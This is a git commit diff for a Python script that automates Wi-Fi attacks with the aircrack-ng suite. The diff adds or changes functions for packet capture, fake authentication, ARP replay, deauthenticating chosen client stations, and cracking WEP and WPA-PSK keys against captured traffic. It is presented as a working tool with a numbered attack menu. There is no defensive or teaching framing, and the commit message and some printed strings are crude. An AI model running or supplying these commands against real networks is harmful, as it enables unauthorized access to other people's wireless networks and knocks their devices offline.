846530b089e0574e5e0bbef0365012175a5cae01
Shazbot <shazbot@localhost.(none)>
2010-11-14 23:55:43 -0800

    added hella shit

--- pussywepped.py
+++ pussywepped.py
@@ -1,7 +1,6 @@
 #!/usr/bin/python
 
 import os
-import time
 
 def init(): 
 	initlist= ';'.join(("service network-manager stop",
@@ -23,7 +22,6 @@ def init():
 		"ifconfig mon1 up"))
 	os.system(initlist)
 
-
 def housekeeping():
 	#back to normal
 	houselist= ';'.join(("airmon-ng stop mon4",
@@ -37,31 +35,37 @@ def housekeeping():
 	os.sys.exit()
 
 def scan():
-	os.system("airodump-ng mon1")
+	print "airodump-ng -t WEP -t WPA -t WPA1 mon1"
+	os.system("airodump-ng -t WEP -t WPA -t WPA1 mon1")
 
 def listen():
+	print "gnome-terminal -x airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1 &"
 	os.system("gnome-terminal -x airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" mon1 &")
 
 def fakeauth():
-	fauth_success = "n"
-        while (fauth_success == "n"):
-		os.system("aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+station+" mon0") 
-		fauth_success = raw_input("Fake-auth success?: ")
+	fauth_success = "y"
+        while (fauth_success == "y"):
+		print "aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e "+essid+" mon0"
+		os.system("aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e "+essid+" mon0") 
+		fauth_success = raw_input("\nretry?: ")
 
-def deauth():
+def arpreplay():
+	print "gnome-terminal -x aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &"
 	os.system("gnome-terminal -x aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")
 
 def deauthsome1():
-	os.system("gnome-terminal -x aireplay-ng -0 900 -b "+bssid+" -c "+target_station+" mon0 &")
+	print "gnome-terminal -x aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" mon0 &"
+	os.system("gnome-terminal -x aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" mon0 &")
 
-
+def WPA_PSK():
+	print "gnome-terminal -x aircrack-ng -w password.lst -b "+bssid+" box/"+essid+"*.cap &"
+	os.system("gnome-terminal -x aircrack-ng -w password.lst -b "+bssid+" box/"+essid+"*.cap & echo w00t \ ")
+#	os.system("aircrack-ng -w password.lst -b "+bssid+" box/"+essid+"*.cap &")
 def aircrack():
+	print "gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &"
+	os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap & echo w00t \ ")
+	print "aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &"
 	os.system("aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &")
-
-def aircracktest():
-        os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*.cap &")
-
-
 #=========================qr=============================D
 
 interface = "wlan0"
@@ -81,14 +85,14 @@ listen()
 
 cont = "n"
 while (cont == "n"): 
-	listen_selection = raw_input("\n 0 Change Target\n 1 Fake-auth(FAST)\n 2 ARP Replay\n 3 Aircrack\n 4 Aircrack(test)\n 5 Quit\n\nplease pick a number: ")
+	listen_selection = raw_input("\n 0 Change Target\n 1 Fake-auth(FAST)\n 2 ARP Replay\n 3 Aircrack\n 4 WPA PSK Crack\n 5 Deauth Someone \n 6 Quit\n\nplease pick a number: ")
 	if listen_selection == "1":
 		fakeauth()
 	elif listen_selection == "2":
-		deauth()
+		arpreplay()
 	elif listen_selection == "3":
 		aircrack()
-	elif listen_selection == "5":
+	elif listen_selection == "6":
 		housekeeping()
 	elif listen_selection == "0":
 		scan()
@@ -99,12 +103,12 @@ while (cont == "n"):
 		macshow = os.popen("macchanger -s mon0")
 		station = macshow.read()[13:30]
 	elif listen_selection == "4":
-		aircracktest()
-	elif listen_selection == "6":
+		WPA_PSK()
+	elif listen_selection == "5":
 		target_station = raw_input("Input station target: ")
 		deauthsome1()		
 	elif listen_selection == "qr":
-		print "Oh god dammit fuck you"
+		print "Oh god dammit, fuck you"
 		housekeeping()
 	else:
 	     print ">:("
